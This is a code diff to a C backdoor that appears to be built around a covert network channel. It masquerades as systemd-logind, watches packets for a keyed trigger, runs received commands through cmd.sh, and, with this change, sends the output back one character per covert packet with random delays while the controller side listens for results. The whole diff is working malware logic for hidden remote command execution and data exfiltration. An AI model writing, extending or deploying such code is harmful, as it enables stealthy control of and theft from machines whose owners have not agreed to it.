@@ -7,6 +7,7 @@
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./cmd.sh > results"
 #define CHMOD "chmod 755 cmd.sh"
+#define RESULT_FILE "results"
 
 struct payload{
     char key[5]; // always 8505
@@ -22,6 +23,10 @@ void ParsePayload(const u_char *payload, int len);
 void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(const unsigned char *tcp_payload);
 bool CheckKey(u_char ip_tos, u_short ip_id);
+void recv_results(char* sip, unsigned short sport);
+void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename);
+int rand_delay(int delay);
+
 int main(int argc, char **argv){
     //strcpy(argv[0], MASK);
     //change the UID/GID to 0 to raise privs
@@ -35,7 +40,9 @@ int main(int argc, char **argv){
     unsigned char data[BUFSIZE] = "ls";
 
     if(strcmp(argv[1],c) == 0){
-        covert_send(sip, dip, dport, sport, data);
+        covert_send(sip, dip, sport, dport, data, 0);
+        recv_results(sip, sport);
+
         exit(1);
     } else {
         Packetcapture();
@@ -210,5 +217,65 @@ void ParsePayload(const u_char *payload, int len){
     unsigned short sport = 8505;
     unsigned short dport = 8505;
 
-    covert_send(srcip, destip, sport, dport, decryptedtext);
+    send_results(srcip, destip, sport, dport, RESULT_FILE);
+}
+
+void recv_results(char* sip, unsigned short sport) {
+    FILE* file;
+    char* filename = "results";
+    char input;
+
+    printf("listening for results\n\n");
+
+    if((file = fopen(filename, "wb")) == NULL) {
+        perror("fopen can't open file");
+        exit(1);
+    }
+
+    while(1) {
+        input = covert_recv(sip, sport, 1, 0, 0, 0);
+        if(input != 0) {
+            printf("Output: %c\n", input);
+            fprintf(file, "%c", input);
+            fflush(file);
+        } else if (input == EOF){
+            return;
+        }
+    }
+}
+
+void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename) {
+    FILE *file;
+    char input;
+    clock_t start;
+    int timer_complete =0, delay  = 0;
+    int max_delay = 1;
+    double passed;
+
+    if((file = fopen(filename, "rb")) == NULL) {
+        perror("fopen can't open file");
+        exit(1);
+    }
+
+    while((input = fgetc(file)) != EOF) {
+        covert_send(sip, dip, sport, dport, (unsigned char *) &input, 1); //send the packet
+        start = clock();    //start of clock
+        timer_complete = 0;    //reset the timer again
+        delay = rand_delay(max_delay);
+        printf("delay: %d\n", delay);
+
+        //wait for the timer to complete
+        while(timer_complete == 0) {
+            passed = (clock() - start) / CLOCKS_PER_SEC;
+            if(passed >= delay) {
+                printf("Delay completed\n");
+                timer_complete = 1;
+            }
+        }
+    }
+}
+
+
+int rand_delay(int delay) {
+    return rand() % delay + 1;
 }
